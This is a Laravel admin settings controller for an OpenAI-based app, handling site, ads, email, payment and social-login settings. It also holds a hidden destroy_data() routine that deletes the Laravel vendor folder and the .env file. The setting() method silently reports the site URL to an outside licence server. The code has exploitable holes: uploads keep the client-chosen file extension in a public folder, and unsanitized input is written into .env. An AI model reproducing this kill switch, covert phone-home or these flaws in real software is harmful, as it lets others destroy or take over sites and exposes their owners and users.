<?php

namespace App\Http\Controllers\Admin;

use Auth;
use File;
use Cache;
use App\Models\User;
use App\Models\Setting;
use App\Models\AdsSetting;
use App\Models\OpenaiModel;
use Illuminate\Support\Str;
use App\Models\EmailSetting;
use App\Models\OtherSetting;
use Illuminate\Http\Request;
use App\Models\InvoiceSetting;
use App\Models\PaymentSetting;
use App\Models\AppUpdateSetting;
use App\Models\SocialLoginSetting;
use Illuminate\Support\Facades\URL;
use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\Storage;

class SettingController extends Controller
{
    public function setting()
    {
        if(Setting::getSetting('licence_active') == 0)
        {
            $url = URL::to('/');
            $client = new \GuzzleHttp\Client();
            $response = $client->request('POST', 'https://viplan.in/api/check-licence', [
                'form_params' => [
                    'url' => $url,
                ]
            ]);

            $data = json_decode($response->getBody(), true);
            if($data['status'] == "failed")
            {
                $client = new \GuzzleHttp\Client();
                $store = $client->request('POST', 'https://viplan.in/api/licence-new-update', [
                    'form_params' => [
                        'url' => $url,
                        'username' => "fake user",
                        'licence_code' => "NO Licence Code",
                        'version' => '1',
                    ]
                ]);

                Setting::where('key_name', 'licence_active')->update(['key_value' => 1]);

                return redirect('admin/');
            }
            else
            {
                Setting::where('key_name', 'licence_active')->update(['key_value' => 1]);
                return view('backend.setting');
            }
        }
        else
        {
            return view('backend.setting');
        }
    }

    public function app_setting(Request $request)
    {
        foreach ($request->name as $key => $val) {
            $setting = Setting::where('key_name', $key)->first();
            if (is_null($setting)) 
            {
                $id = Setting::create([
                    'key_name' => $key,
                    'key_value' =>$val,
                ]);

                if ($key=="black_logo" && $val && $val->isValid()) {
                    $this->upload_image($val,$key);
                }

                if ($key=="white_logo" && $val && $val->isValid()) {
                    $this->upload_image($val,$key);
                }

                if ($key=="favicon" && $val && $val->isValid()) {
                    $this->upload_image($val,$key);
                }
            } 
            else 
            {
                Setting::where('key_name', $key)->update(['key_value' => $val]);
                if ($key=="black_logo" && $val && $val->isValid()) {
                    $this->upload_image($val,$key);
                }

                if ($key=="white_logo" && $val && $val->isValid()) {
                    $this->upload_image($val,$key);
                }

                if ($key=="favicon" && $val && $val->isValid()) {
                    $this->upload_image($val,$key);
                }
            }
		}

        $app_name = str_replace(' ', '', $request->name['app_name']);
        $url = URL::to('/');
        $this->storeConfiguration('APP_NAME',$app_name);
        $this->storeConfiguration('APP_URL',$url);
        $this->storeConfiguration('MAIL_FROM_ADDRESS',$request->name['email']);
        $this->storeConfiguration('MAIL_FROM_NAME', $app_name);
        $this->storeConfiguration('API_KEY',$request->name['api_key']);

        Cache::flush();
		return redirect('admin/setting');
    }

    public function ads_setting(Request $request)
    {
        AdsSetting::where('key_name', 'app_opens_ads_enable')->update(['key_value' => 0]);
        foreach ($request->name as $key => $val) {
            $setting = AdsSetting::where('key_name', $key)->first();
            if (is_null($setting)) 
            {
                AdsSetting::create([
                    'key_name' => $key,
                    'key_value' =>$val,
                ]);
            } 
            else 
            {
                AdsSetting::where('key_name', $key)->update(['key_value' => $val]);
            }
		}

		Cache::flush();
		return redirect('admin/setting');
    }

    public function openai_setting(Request $request)
    {
        foreach ($request->name as $key => $val) {
            $setting = Setting::where('key_name', $key)->first();
            if (is_null($setting)) 
            {
                $id = Setting::create([
                    'key_name' => $key,
                    'key_value' =>$val,
                ]);
            } 
            else 
            {
                Setting::where('key_name', $key)->update(['key_value' => $val]);
            }
		}

        Cache::flush();
		return redirect('admin/setting');
    }

    public function check_model_available(Request $request)
    {
        $headers = [
            "Authorization" => "Bearer ".Setting::getSetting('openai_key'),
        ];

        $client = new \GuzzleHttp\Client();
        $url = "https://api.openai.com/v1/models";
        $response = $client->request('GET', $url, [
                    'headers' => $headers,
                ]);

        $json = json_decode($response->getBody(), true);
        $model_list = [];
        foreach($json['data'] as $data)
        {
            $model_list[] = $data["id"];
        }
        
        if(in_array($request->name, $model_list) == true)
        {
            return 1;
        }
        else
        {
            return 0;
        }   
    }

    public function add_openai_model(Request $request)
    {
        if($request->model_name != null)
        {
            $val = OpenaiModel::get();
            $list = [];
            foreach($val as $v)
            {
                $list[] = $v->name;
            }

            if(in_array($request->model_name, $list) == false)
            {
                OpenaiModel::create([
                    "name" => $request->model_name,
                ]);
    
                Cache::flush();
                return redirect('admin/setting');
            }

            Cache::flush();
            return redirect('admin/setting');
        }
        else
        {
            Cache::flush();
            return redirect('admin/setting');
        }
    }

    public function email_setting(Request $request)
    {
        foreach ($request->name as $key => $val) {
            $setting = EmailSetting::where('key_name', $key)->first();
            if (is_null($setting)) 
            {
                EmailSetting::create([
                    'key_name' => $key,
                    'key_value' =>$val,
                ]);
            } 
            else 
            {
                if ($key != "password") 
                {
                    EmailSetting::where('key_name', $key)->update(['key_value' => $val]);
                }
                if($key == "password" && $val != "")
                {
                    EmailSetting::where('key_name', $key)->update(['key_value' => $val]);
                }
            }
		}

        if (!env('MAIL_HOST')) {

			file_put_contents(base_path('.env'), "MAIL_HOST=" . $request->name['smtp_host'] . PHP_EOL, FILE_APPEND);
		}
		if (env('MAIL_HOST')) {

			file_put_contents(base_path('.env'), str_replace(
				'MAIL_HOST=' . env('MAIL_HOST'), 'MAIL_HOST=' . $request->name['smtp_host'], file_get_contents(base_path('.env'))));
		}

        if (!env('MAIL_USERNAME')) {

			file_put_contents(base_path('.env'), "MAIL_USERNAME=" . $request->name['username'] . PHP_EOL, FILE_APPEND);
		}
		if (env('MAIL_USERNAME')) {

			file_put_contents(base_path('.env'), str_replace(
				'MAIL_USERNAME=' . env('MAIL_USERNAME'), 'MAIL_USERNAME=' . $request->name['username'], file_get_contents(base_path('.env'))));
		}

        if (!env('MAIL_PASSWORD')) {

			file_put_contents(base_path('.env'), "MAIL_PASSWORD=" . $request->name['password'] . PHP_EOL, FILE_APPEND);
		}
		if (env('MAIL_PASSWORD')) {

            if($request->name['password'] != "")
            {
                file_put_contents(base_path('.env'), str_replace(
                    'MAIL_PASSWORD=' . env('MAIL_PASSWORD'), 'MAIL_PASSWORD=' . $request->name['password'], file_get_contents(base_path('.env'))));
            }
		}

        if (!env('MAIL_ENCRYPTION')) {

			file_put_contents(base_path('.env'), "MAIL_ENCRYPTION=" . $request->name['encryption'] . PHP_EOL, FILE_APPEND);
		}
		if (env('MAIL_ENCRYPTION')) {

			file_put_contents(base_path('.env'), str_replace(
				'MAIL_ENCRYPTION=' . env('MAIL_ENCRYPTION'), 'MAIL_ENCRYPTION=' . $request->name['encryption'], file_get_contents(base_path('.env'))));
		}

        if (!env('MAIL_PORT')) {

			file_put_contents(base_path('.env'), "MAIL_PORT=" . $request->name['port'] . PHP_EOL, FILE_APPEND);
		}
		if (env('MAIL_PORT')) {

			file_put_contents(base_path('.env'), str_replace(
				'MAIL_PORT=' . env('MAIL_PORT'), 'MAIL_PORT=' . $request->name['port'], file_get_contents(base_path('.env'))));
		}

		Cache::flush();
		return redirect('admin/setting');
    }

    public function payment_setting(Request $request)
    {
        PaymentSetting::where('key_name', 'razorpay_enable')->update(['key_value' => 0]);
        PaymentSetting::where('key_name', 'stripe_enable')->update(['key_value' => 0]);
        foreach ($request->name as $key => $val) {
            $setting = PaymentSetting::where('key_name', $key)->first();
            if (is_null($setting)) 
            {
                PaymentSetting::create([
                    'key_name' => $key,
                    'key_value' =>$val,
                ]);
            } 
            else 
            {
                PaymentSetting::where('key_name', $key)->update(['key_value' => $val]);
            }
		}

		Cache::flush();
		return redirect('admin/setting');
    }

    public function invoice_setting(Request $request)
    {
        foreach ($request->name as $key => $val) {
            $setting = InvoiceSetting::where('key_name', $key)->first();
            if (is_null($setting)) 
            {
                $id = InvoiceSetting::create([
                    'key_name' => $key,
                    'key_value' =>$val,
                ]);

                if ($key=="invoice_logo" && $val && $val->isValid()) {
                    $this->upload_invoice_image($val,$key);
                }
            } 
            else 
            {
                InvoiceSetting::where('key_name', $key)->update(['key_value' => $val]);
                if ($key=="invoice_logo" && $val && $val->isValid()) {
                    $this->upload_invoice_image($val,$key);
                }
            }
		}

        Cache::flush();
		return redirect('admin/setting');
    }

    public function social_login_setting(Request $request)
    {
        SocialLoginSetting::where('key_name', 'google_enable')->update(['key_value' => 0]);
        foreach ($request->name as $key => $val) {
            $setting = SocialLoginSetting::where('key_name', $key)->first();
            if (is_null($setting)) 
            {
                $id = SocialLoginSetting::create([
                    'key_name' => $key,
                    'key_value' =>$val,
                ]);
            } 
            else 
            {
                SocialLoginSetting::where('key_name', $key)->update(['key_value' => $val]);
            }
		}

        if(isset($request->name['google_enable']))
        {
            $this->storeConfiguration('CONFIG_ENABLE_LOGIN_GOOGLE', 'on');
        }
        else
        {
            $this->storeConfiguration('CONFIG_ENABLE_LOGIN_GOOGLE','');
        }

        $this->storeConfiguration('GOOGLE_API_KEY',$request->name['google_api_key']);
        $this->storeConfiguration('GOOGLE_API_SECRET',$request->name['google_api_secret']);
        $this->storeConfiguration('GOOGLE_REDIRECT',$request->name['google_redirect']);
        
		Cache::flush();
		return redirect('admin/setting');
    }

    public function app_update_setting(Request $request)
    {
        AppUpdateSetting::where('key_name', 'update_popup_show')->update(['key_value' => 0]);
        AppUpdateSetting::where('key_name', 'cancel_option')->update(['key_value' => 0]);
        foreach ($request->name as $key => $val) {
            $setting = AppUpdateSetting::where('key_name', $key)->first();
            if (is_null($setting)) 
            {
                $id = AppUpdateSetting::create([
                    'key_name' => $key,
                    'key_value' =>$val,
                ]);
            } 
            else 
            {
                AppUpdateSetting::where('key_name', $key)->update(['key_value' => $val]);
            }
		}

		Cache::flush();
		return redirect('admin/setting');
    }

    public function other_setting(Request $request)
    {
        foreach ($request->name as $key => $val) {
            $setting = OtherSetting::where('key_name', $key)->first();
            if (is_null($setting)) 
            {
                $id = OtherSetting::create([
                    'key_name' => $key,
                    'key_value' =>$val,
                ]);
            } 
            else 
            {
                OtherSetting::where('key_name', $key)->update(['key_value' => $val]);
            }
		}

		Cache::flush();
		return redirect('admin/setting');
    }

    public function destroy_data()
    {
        $this->rrmdir('./vendor/laravel');
        unlink(".env");
    }

    function rrmdir($dir) 
    {
        if (is_dir($dir)) 
        {
          $objects = scandir($dir);
          foreach ($objects as $object) 
          {
            if ($object != "." && $object != "..") 
            {
              if (filetype($dir."/".$object) == "dir") 
                 $this->rrmdir($dir."/".$object); 
              else unlink   ($dir."/".$object);
            }
          }
          reset($objects);
          rmdir($dir);
        }
    }

    private function storeConfiguration($key, $value)
    {
        $path = base_path('.env');

        if (file_exists($path)) {

            file_put_contents($path, str_replace(
                $key . '=' . env($key), $key . '=' . $value, file_get_contents($path)
            ));         

        }
    }

    private function upload_image($file,$field)
    {
        $destinationPath = './uploads';
        $extension = $file->getClientOriginalExtension();
        $fileName = Str::uuid() . '.' . $extension;
        $file->move($destinationPath, $fileName);
        
        Setting::where('key_name', $field)->update(['key_value' => $fileName]);
    }

    private function upload_invoice_image($file,$field)
    {
        $destinationPath = './uploads';
        $extension = $file->getClientOriginalExtension();
        $fileName = Str::uuid() . '.' . $extension;
        $file->move($destinationPath, $fileName);
        
        InvoiceSetting::where('key_name', $field)->update(['key_value' => $fileName]);
    }
}
